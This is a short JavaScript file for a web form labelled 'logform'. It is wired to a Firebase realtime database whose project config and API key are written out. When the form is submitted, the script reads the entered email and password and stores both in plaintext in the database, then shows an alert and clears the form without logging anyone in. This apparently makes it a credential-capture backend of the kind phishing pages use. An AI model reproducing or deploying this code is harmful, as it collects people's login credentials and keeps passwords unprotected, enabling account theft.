const firebaseConfig = {
    apiKey: "AIzaSyCfa1eVZdsftIGx5J7ZzrSmqoqHRdsdNf0",
    authDomain: "logform-53f8f.firebaseapp.com",
    databaseURL: "https://logform-53f8f-default-rtdb.firebaseio.com",
    projectId: "logform-53f8f",
    storageBucket: "logform-53f8f.appspot.com",
    messagingSenderId: "78283635185",
    appId: "1:78283635185:web:8c9c9b0fe2a202baa36c50"
  };


  firebase.initializeApp(firebaseConfig);
  
  // reference your database
  var logformDB = firebase.database().ref("logform");

  document.getElementById("logform").addEventListener("submit", submitForm);

  function submitForm(e) {
    e.preventDefault();
  
    var Email = getElementVal("Email");
    var password     = getElementVal("password");
   
    saveMessages( Email,password );

    //   enable alert
    document.querySelector(".alert").style.display = "block";
  
    //   remove the alert
    setTimeout(() => {
      document.querySelector(".alert").style.display = "none";
    }, 3000);

   //   reset the form
   document.getElementById("logform").reset();
}

const saveMessages = (Email,password) => {
    var newlogform = logformDB.push();
  
    newlogform.set({
      Email:Email,
        password:password
    });
  };
  
  const getElementVal = (id) => {
    return document.getElementById(id).value;
  };